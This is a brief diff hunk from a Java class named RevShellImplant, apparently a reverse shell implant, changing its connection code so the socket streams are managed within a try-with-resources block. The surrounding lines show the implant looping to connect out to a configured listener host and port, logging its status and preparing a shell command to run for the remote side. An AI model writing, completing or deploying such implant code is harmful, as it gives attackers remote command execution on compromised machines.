@@ -83,9 +83,10 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
         while (!Thread.interrupted()) {
             log("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
-            try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT)) {
+            try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT);
                 InputStream fromRemote = connection.getInputStream();
                 OutputStream toRemote = connection.getOutputStream();
+            ) {
                 log("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");
 
                 String shellCommandExecStr = shellCommand.get().toAbsolutePath().toString();
